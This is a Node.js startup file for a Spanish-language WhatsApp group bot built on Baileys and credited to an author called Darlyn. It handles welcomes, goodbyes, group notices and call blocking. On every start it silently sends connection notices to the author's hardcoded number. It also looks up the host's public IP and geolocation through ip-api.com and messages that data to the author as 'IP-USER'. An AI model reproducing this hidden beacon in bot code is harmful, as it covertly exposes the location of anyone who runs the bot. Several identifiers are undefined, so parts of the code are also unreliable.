///   BOT BY DARLYN XDXD
///   https://wa.me/+51918303426
///   https://wa.me/+51956570030
const {
  WAConnection: _WAConnection,
  MessageType,
  Presence,
  Mimetype,
  GroupSettingChange,
} = require("@adiwajshing/baileys");
const simple = require("./lib/simple.js");
const WAConnection = simple.WAConnection(_WAConnection);
const figlet = require('figlet')
const fs = require("fs");
const { version, bugs } = require('./package.json')
const { banner, start, success, getGroupAdmins } = require("./lib/functions");
const fetch = require("node-fetch");
const moment = require("moment-timezone");
blocked = [];
const { color } = require('./lib/color')
const time2 = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    if (time2 < "24:59:00") {
      var ucapanWaktu = "Buenas Noches";
    }
    if (time2 < "19:00:00") {
      var ucapanWaktu = "Buenas Tardes🌞";
    }
    if (time2 < "18:00:00") {
      var ucapanWaktu = "Buenas Tardes🌄";
    }
    if (time2 < "15:00:00") {
      var ucapanWaktu = "Buenas Tardes☀️";
    }
    if (time2 < "11:00:00") {
      var ucapanWaktu = "Buenos días🌅";
    }
    if (time2 < "05:00:00") {
      var ucapanWaktu = "Buenas Noches🌃";
    }
const runtime = function (seconds) {
  seconds = Number(seconds);
  var d = Math.floor(seconds / (3600 * 24));
  var h = Math.floor((seconds % (3600 * 24)) / 3600);
  var m = Math.floor((seconds % 3600) / 60);
  var s = Math.floor(seconds % 60);
  var dDisplay = d > 0 ? d + (d == 1 ? " dia, " : " Dia, ") : "";
  var hDisplay = h > 0 ? h + (h == 1 ? " horas, " : " Horas, ") : "";
  var mDisplay = m > 0 ? m + (m == 1 ? " minutos, " : " Minutos, ") : "";
  var sDisplay = s > 0 ? s + (s == 1 ? " segundos" : " Segundos") : "";
  return dDisplay + hDisplay + mDisplay + sDisplay;
};
fakenomor = '0@s.whatsapp.net'
const gcrevoke = ["51918303426-1621430788@g.us"]
prefix = '/'
shp = '⬡'
owner = "51918303426@s.whatsapp.net"
spc1 = '         '
spc2 = '\n                           '
spc3 = '                   '
spc4 = '               '
require("./index.js");
nocache("./index.js", (module) => console.log(`${module} Ah sido actualizado uwu.`));
const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}
const starts = async (client = new WAConnection()) => {
  client.logger.level = "warn";
  client.version = [2, 2143, 3];
  client.browserDescription = ["DARLYN-BOT", "3.0"];
console.log(color(figlet.textSync('SOFFF', {
font: 'Standard',
horizontalLayout: 'default',
vertivalLayout: 'default',
width: 80,
whitespaceBreak: false
}), 'blue'))
console.log(color(`[ • CREADOR DARLYN • ]` ,'brown'))
console.log(color(`< ================================================== >`, 'orange'))
console.log(color(`[•]`, 'aqua'), color(`Hola        : ${ucapanWaktu}`, 'pink'))
console.log(color(`[•]`, 'aqua'), color(`Bot Version : 2.1.2`, 'red'))
console.log(color(`[•]`, 'aqua'), color(`Estado      : Online!`, 'cyan'))
console.log(color(`[•]`, 'aqua'), color(`Dueño       : ${fakeyoi}`, 'purple'))
console.log(color(`< ================================================== >`, 'brown'))
console.log(color(figlet.textSync('+51918303426', {
font: 'Standard',
horizontalLayout: 'default',
vertivalLayout: 'default',
width: 80,
whitespaceBreak: false
}), 'grey'))
  client.on("qr", () => {
    console.log(
      color("[", "pink"),
      color("!", "blue"),
      color("]", "orange"),
      color(" ESCANEA EL CODIGO QR"),
    );
  });

  fs.existsSync("./session.json") && client.loadAuthInfo("./session.json");
  client.on("connecting", () => {
    start("2", "Conectándo...");
  });
  client.on("open", () => {
    success("2", "Conectado!");
  });
await client.connect({ timeoutMs: 30 * 1000 });
  fs.writeFileSync("./session.json",JSON.stringify(client.base64EncodedAuthInfo(), null, "\t"));    
    client.on('connecting', () => {
		console.log(color('|TRM|'), color('Conectando...', 'pink'))
		})
	
	client.on('open', () => {
	console.log(color('|TRM|'), color('Conectando', 'red'))
	}) 
	client.sendMessage(`51918303426@s.whatsapp.net`, `「 *NOTIFICACIÓN!* 」\n\n _*Conectado Con Éxito uh!*_\n_*By ८≛ 𝓓𝓪𝓻𝓵𝔂𝓷 𔐬☆᤻᤻[𝓼𝓮𝔁]*_`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: false, externalAdReply:{title: "Si quieres este bot, da clic aquí\nHola, soy ८≛ 𝓓𝓪𝓻𝓵𝔂𝓷 𔐬☆᤻᤻[𝓼𝓮𝔁]",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./cnf.jpg'),sourceUrl:"https://wa.me/51918303426?text=Hola%20owner%20Como%20estas?%20"}}})
        client.sendMessage(`51918303426@s.whatsapp.net`, `_*८≛ 𝓓𝓪𝓻𝓵𝔂𝓷 𔐬☆᤻᤻[𝓼𝓮𝔁]*_`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: false, externalAdReply:{title: "Hola, soy ८≛ 𝓓𝓪𝓻𝓵𝔂𝓷 𔐬☆᤻᤻[𝓼𝓮𝔁]",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./dararchivos/imagen/sofff.jpg'),sourceUrl:"https://wa.me/51918303426?text=Hola%20owner%20Como%20estas?%20"}}})
   /////// client.sendMessage(`51918303426@s.whatsapp.net`, `_*Usa /menu /rg*_`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: false, externalAdReply:{title: "Hola, soy ८≛ 𝓓𝓪𝓻𝓵𝔂𝓷 𔐬☆᤻᤻[𝓼𝓮𝔁]",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./stik/thumb.jpeg'),sourceUrl:"https://wa.me/51918303426?text=Hola%20owner%20Como%20estas?%20"}}})
     fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       client.sendMessage("51918303426@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n──────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: false, externalAdReply:{title: "Creador Darlyn",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./dararchivos/imagen/ALONSOZING.jpg'),sourceUrl:"https://wa.me/51918303426?text=Ola"}}})
       console.log(color('|WRN|', 'yellow'), color('Enviando IP', 'red'))
       console.log(color('|DARLYN|', 'red'), color('Todo esta listo uh!!!!', 'gold'))
       console.log(color('|WRN|', 'pink'), color('Creado por Darlyn xd', 'purple'))

        client.on('ws-close', () => {
        console.log(color('|TRM|'), color('Conexión perdida, intentando volver a conectar.', 'cyan'))
        })
    
        client.on('close', async () => {
        console.log(color('|TRM|'), color('Desconectado.', 'brown'))
        })
    
client.on('group-update', async (anu) => {
fkontakk = { key: {
  fromMe: false,
    participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '33687888557-1604595598@g.us' } : {})
},
 message: {
    "contactMessage":{"displayName":'८≛ 𝓓𝓪𝓻𝓵𝔂𝓷 𔐬☆᤻᤻[𝓼𝓮𝔁]',"vcard":"BEGIN:VCARD\nVERSION:3.0\nN:2;Darlyn;;;\nFN:Creador\nitem1.TEL;waid=33687888557:+33 6 87 88 85 57\nitem1.X-ABLabel:Mobile\nEND:VCARD"
 }}}
metdata = await client.groupMetadata(anu.jid)
if(anu.announce == 'false'){
teks = ` [ Grupo abierto ] \n\n_\n_Ya pueden enviar mensajes_`
client.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
console.log(`- [ Grupo Abierto ] - En ${metdata.subject}`)
}
else if(anu.announce == 'true'){
teks = ` [ Grupo Cerrado ] \n\n_Grupo Cerrado ya no pueden enviar mensajes_`
client.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
console.log(` [ Grupo Cerrado ]  En ${metdata.subject}`)
}
else if(!anu.desc == ''){
tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
teks = ` [ Nueva Descripción ] \n\n La Nueva Descripción es :\n\n${anu.desc}`
client.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: fkontakk})
console.log(`- [ NUEVA DESC ] - En ${metdata.subject}`)
  }
else if(anu.restrict == 'false'){
teks = `- [ Nuevos ajustes ] -\n\nSe ha cerrado la edición de la información del grupo para los miembros.\nAhora solo el administrador del grupo puede editar la información de este grupo`
client.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
console.log(` [ Ajustes cerrado ]  En ${metdata.subject}`)
}
else if(anu.restrict == 'true'){
teks = `- [ Nuevos ajustes ] -\n\nSe ha abierto la opción Editar información del grupo para los miembros.\nAhora todos los miembros pueden editar la información de este grupo.`
client.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
console.log(` [ Ajuste abierto ]  En ${metdata.subject}`)
}
})
  client.on("group-participants-update", async (anu) => {
    try {
      groupMet = await client.groupMetadata(anu.jid);
      groupMembers = groupMet.participants;
      groupAdmins = getGroupAdmins(groupMembers);
      mem = anu.participants[0];

      console.log(anu);
      try {
        pp_user = await client.getProfilePicture(mem);
      } catch (e) {
        pp_user =
          "https://i.ibb.co/t35HfVx/ALONSOZING.jpg";
      }
      try {
        pp_grup = await client.getProfilePicture(anu.jid);
      } catch (e) {
        pp_grup =
          "https://i.ibb.co/t35HfVx/ALONSOZING.jpg";
      }
      if (anu.action == "add" && mem.includes(client.user.jid)) {
        client.sendMessage(anu.jid, "Hola, para ver el menu del bot escribe:\n\n#menu\n#help\n#allmenu\n#info", "conversation");
	        sofia = fs.readFileSync('./cofi2.jpg') 
                client.sendMessage(anu.jid, sofia, MessageType.image)
	        darlyn = fs.readFileSync(`./dararchivos/pegatina/lachuu.webp`)
	        client.sendMessage(anu.jid, darlyn, Message.sticker)
                }
             hehe = await getBuffer(pp_user)
             if (anu.action == 'add' && !mem.includes(client.user.jid)) {
             const mdata = await client.groupMetadata(anu.jid)
             const memeg = mdata.participants.length
             const thu = await client.getStatus(anu.participants[0], MessageType.text)
             const num = anu.participants[0]
             const bosco1 = await client.prepareMessage("0@s.whatsapp.net", hehe, MessageType.location,{ thumbnail: hehe})
			 const bosco2 = bosco1.message["ephemeralMessage"] ? bosco1.message.ephemeralMessage : bosco1
                let v = client.contacts[num] || { notify: num.replace(/@.+/, '') }
                anu_user = v.vname || v.notify || num.split('@')[0]
                time_welc = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
                time_wel = moment.tz('Asia/Kolkata').format("hh:mm")
                teks = `⎙ *Hoʟa* @${num.split('@')[0]}\n⎙ *Bɪᴏ* : *${thu.status}*\n⎙ *Mɪᴇᴍʙʀᴏs : ${memeg}*\n⎙ *Wᴇʟᴄᴏᴍᴇ a* \n *${mdata.subject}*\n⎙ *Lee la descripción*\n⎙ 𝘜𝘴𝘢 /𝘩𝘦𝘭𝘱 𝘱𝘢𝘳𝘢 𝘷𝘦𝘳 𝘦𝘭 𝘮𝘦𝘯𝘶 𝘥𝘦𝘭 𝘣𝘰𝘵\n\n⎙ 𝓢𝓸𝓯í𝓪\n⎙ ८≛ 𝓓𝓪𝓻𝓵𝔂𝓷 𔐬☆᤻᤻[𝓼𝓮𝔁]`
                welcomeBut = [{buttonId:`getdeskgc`,buttonText:{displayText:'DESCRIPCION'},type:1}]
                welcomeButt = { contentText: ` `, footerText: `${teks}`, buttons: welcomeBut, headerType: 6, locationMessage: bosco2.message.locationMessage}
                client.sendMessage(mdata.id, welcomeButt, MessageType.buttonsMessage, { caption: 'hehe', "contextInfo": { "mentionedJid" : [num], },})
                 }
	          if (anu.action == 'remove' && !mem.includes(client.user.jid)) {
                  const mdata = await client.groupMetadata(anu.jid)
                  
                  const memeg = mdata.participants.length
                  const thu = await client.getStatus(anu.participants[0], MessageType.text)
                  const num = anu.participants[0]
                  const bosco1 = await client.prepareMessage("0@s.whatsapp.net", hehe, MessageType.location,{ thumbnail: hehe})
                  const bosco2 = bosco1.message["ephemeralMessage"] ? bosco1.message.ephemeralMessage : bosco1
                  let v = client.contacts[num] || { notify: num.replace(/@.+/, '') }
                  anu_user = v.vname || v.notify || num.split('@')[0]
                  time_welc = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
                  time_wel = moment.tz('Asia/Kolkata').format("hh:mm")
                  teks = `*ADIOS* @${num.split('@')[0]}\n *SALIO DE ${mdata.subject}*\n*${thu.status}*\n८≛ 𝓓𝓪𝓻𝓵𝔂𝓷 𔐬☆᤻᤻[𝓼𝓮𝔁]`
                  welcomeBut = [{buttonId:`pene`,buttonText:{displayText:'ADIOS XD'},type:1}]
                  welcomeButt = { contentText: ` `, footerText: `${teks}`, buttons: welcomeBut, headerType: 6, locationMessage: bosco2.message.locationMessage}
                  client.sendMessage(mdata.id, welcomeButt, MessageType.buttonsMessage, { caption: 'hehe', "contextInfo": { "mentionedJid" : [num], },})
                  } 
	     /*if (anu.action == 'add') {
              const mdata = await client.groupMetadata(anu.jid)
              num = anu.participants[0]
              try {
              ppimg = await cnf.getProfilePicture(`${num.split('@')[0]}@c.us`)
              } catch {
              ppimg = 'https://i.ibb.co/t35HfVx/ALONSOZING.jpg'
              }
              let buff = await getBuffer(ppimg)
              welcomeBut =`_*Bienvenido/a:*_ *@${num.split('@')[0]}*\n_*Grupo:*_ _*${mdata.subject}*_`
              client.sendMessage(mdata.id, welcomeBut, MessageType.text, {thumbnail: fs.readFileSync('./dararchivos/imagen/sofff.jpg'), contextInfo: { externalAdReply:{title: `Nuevo miembro: ${mdata.subject}`,body:"By ८≛ 𝓓𝓪𝓻𝓵𝔂𝓷 𔐬☆᤻᤻[𝓼𝓮𝔁]",mediaType:"2",thumbnail:buff,sourceUrl:`https://wa.me/51918303426`}, "mentionedJid": [num]}})
              }
              if (anu.action == 'remove') {
              const mdata = await client.groupMetadata(anu.jid)
              num = anu.participants[0]
              try {
              ppimg = await cnf.getProfilePicture(`${num.split('@')[0]}@c.us`)
              } catch {
              ppimg = 'https://i.ibb.co/kHy56J4/mariposazing.jpg'
              }
              let buff = await getBuffer(ppimg)
              welcomeBut =`_*Salio:*_ *@${num.split('@')[0]}*\n_*Grupo:*_ _*${mdata.subject}*_`
              client.sendMessage(mdata.id, welcomeBut, MessageType.text, {thumbnail: fs.readFileSync('./dararchivos/imagen/sofff.jpg'), contextInfo: { externalAdReply:{title: `Salio de: ${mdata.subject}`,body:"By ८≛ 𝓓𝓪𝓻𝓵𝔂𝓷 𔐬☆᤻᤻[𝓼𝓮𝔁]",mediaType:"2",thumbnail:buff,sourceUrl:`https://wa.me/51918303426`}, "mentionedJid": [num]}})
              }*/
                       if (anu.action == 'promote') {
                        const mdata = await client.groupMetadata(anu.jid)
                        num = anu.participants[0]
                        try {
                        ppimg = await cnf.getProfilePicture(`${num.split('@')[0]}@c.us`)
                        } catch {
                        ppimg = 'https://i.ibb.co/t35HfVx/ALONSOZING.jpg'
                        }
                        let buff = await getBuffer(ppimg)
                        welcomeBut =`_*Nuevo admin:*_ *@${num.split('@')[0]}*\n_*Grupo:*_ _*${mdata.subject}*_`
                        client.sendMessage(mdata.id, welcomeBut, MessageType.text, {thumbnail: fs.readFileSync('./dararchivos/imagen/sofff.jpg'), contextInfo: { externalAdReply:{title: `Nuevo admin en: ${mdata.subject}`,body:"By ८≛ 𝓓𝓪𝓻𝓵𝔂𝓷 𔐬☆᤻᤻[𝓼𝓮𝔁]",mediaType:"2",thumbnail:buff,sourceUrl:`https://wa.me/51918303426`}, "mentionedJid": [num]}})
                       }
                        if (anu.action == 'demote') {
                        const mdata = await client.groupMetadata(anu.jid)
                        num = anu.participants[0]
                        try {
                        ppimg = await cnf.getProfilePicture(`${num.split('@')[0]}@c.us`)
                        } catch {
                        ppimg = 'https://i.ibb.co/kHy56J4/mariposazing.jpg'
                        }
                        let buff = await getBuffer(ppimg)
                        welcomeBut =`_*Admin descartado:*_ *@${num.split('@')[0]}*\n_*Grupo:*_ _*${mdata.subject}*_`
                        client.sendMessage(mdata.id, welcomeBut, MessageType.text, {thumbnail: fs.readFileSync('./dararchivos/imagen/sofff.jpg'), contextInfo: { externalAdReply:{title: `Admin descartado en: ${mdata.subject}`,body:"By ८≛ 𝓓𝓪𝓻𝓵𝔂𝓷 𔐬☆᤻᤻[𝓼𝓮𝔁]",mediaType:"2",thumbnail:buff,sourceUrl:`https://wa.me/51918303426`}, "mentionedJid": [num]}})
                        }
    } catch (e) {
      console.log("Error : %s", color(e, "red"));
    }
  });
  //
 antidel = false
  client.on("message-delete", async (m) => {
    if (m.key.remoteJid == "status@broadcast") return;
    if (!m.key.fromMe && m.key.fromMe) return;
   if (antidel === false) return
    m.message =
      Object.keys(m.message)[0] === "ephemeralMessage"
        ? m.message.ephemeralMessage.message
        : m.message;
    const jam = moment.tz("Asia/Jakarta").format("HH:mm:ss");
    let d = new Date();
    let locale = "id";
    let gmt = new Date(0).getTime() - new Date("7 noviembre 2021").getTime();
    let weton = ["Pahing", "Pon", "Wage", "Kliwon", "Legi"][
      Math.floor((d * 1 + gmt) / 84600000) % 5
     ];
    let week = d.toLocaleDateString(locale, { weekday: "long" });
    let calender = d.toLocaleDateString(locale, {
      day: "numeric",
      month: "long",
      year: "numeric",
    });
     const type = Object.keys(m.message)[0];

    client.copyNForward(m.key.remoteJid, m.message);
  });
  client.on("chat-update", async (message) => {
    require("./index.js")(client, message);
  });
  isBattre = "No Detectado"; //
  isCharge = "No Detectado"; //
  client.on(`CB:action,,battery`, (json) => {
    const batteryLevelStr = json[2][0][1].value;
    const batterylevel = parseInt(batteryLevelStr);
    isBattre = batterylevel + "%";
    isCharge = json[2][0][1].live;
  });
antical = true
client.on("CB:Call", json => {
if (antical === false) return
let call;
calling = JSON.parse(JSON.stringify(json))
call = calling[1].from
client.sendMessage(call, `*Lo siento ${client.user.name} no se permiten llamadas*`, MessageType.text)
.then(() => client.blockUser(call, "add"))
})
  client.on("CB:Blocklist", (json) => {
    if (blocked.length > 2) return;
    for (let i of json[1].blocklist) {
      blocked.push(i.replace("c.us", "s.whatsapp.net"));
    }
  });
})}

function nocache(module, cb = () => {}) {
  console.log("Modulo", `'${module}'`, "Ah sido actualizado");
  fs.watchFile(require.resolve(module), async () => {
    await uncache(require.resolve(module));
    cb(module);
  });
}

function uncache(module = ".") {
  return new Promise((resolve, reject) => {
    try {
      delete require.cache[require.resolve(module)];
      resolve();
    } catch (e) {
      reject(e);
    }
  });
}

starts();

//// DARLYN UH /////
//////       https//wa.me/51918303426       //////////////
//////       https://wa.me/51956570030     ///////////////

////////////      ///////////    ////////////   ///      ///     ///    /////////   ///
///       ///     ///     ///    ///      ///   ///       ///    ///    ///   ///   ///
///       ////    ///     ///    ///     ///    ///        ///   ///    ///   ///   ///
///       ///     ///     ///    ////////       ///         /// ///     ///   ///   ///
///       ///     ///////////    ///    ///     ///           ////      ///   ///   ///
///      ////     ///     ///    ///     ///    ///           ///       ///   ///   ///
///      ////     ///     ///    ///     ///    ///           ///       ///   ///   ///
//////////        ///     ///    ///      ///   //////////    ///       ///   ////////
